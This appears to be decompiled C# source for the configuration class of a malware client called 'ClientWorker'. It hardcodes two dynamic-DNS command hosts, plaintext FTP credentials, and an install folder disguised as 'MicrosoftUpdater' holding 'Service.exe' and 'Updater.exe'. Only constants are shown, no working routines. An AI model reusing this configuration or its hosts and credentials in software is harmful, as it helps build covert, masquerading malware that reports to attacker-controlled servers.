using System;
using System.Collections.Generic;

namespace ClientWorker
{
	// Token: 0x02000008 RID: 8
	public static class StartData
	{
		// Token: 0x04000010 RID: 16
		public static float version = 1f;

		// Token: 0x04000011 RID: 17
		public static string currentUser = "fokes1.asuscomm.com";

		// Token: 0x04000012 RID: 18
		public static string ftpUser = "ff";

		// Token: 0x04000013 RID: 19
		public static string ftpPass = "WorkerFF";

		// Token: 0x04000014 RID: 20
		public static int ftpPort = 21;

		// Token: 0x04000015 RID: 21
		public static string floaderNewCopy = "\\MicrosoftUpdater\\";

		// Token: 0x04000016 RID: 22
		public static string service = "Service.exe";

		// Token: 0x04000017 RID: 23
		public static string updater = "Updater.exe";

		// Token: 0x04000018 RID: 24
		public static List<string> ddnsHostName = new List<string>
		{
			"fokes1.asuscomm.com",
			"us30.dlinkddns.com"
		};

		// Token: 0x04000019 RID: 25
		public static List<string> listFiles = new List<string>
		{
			"Service.exe"
		};
	}
}
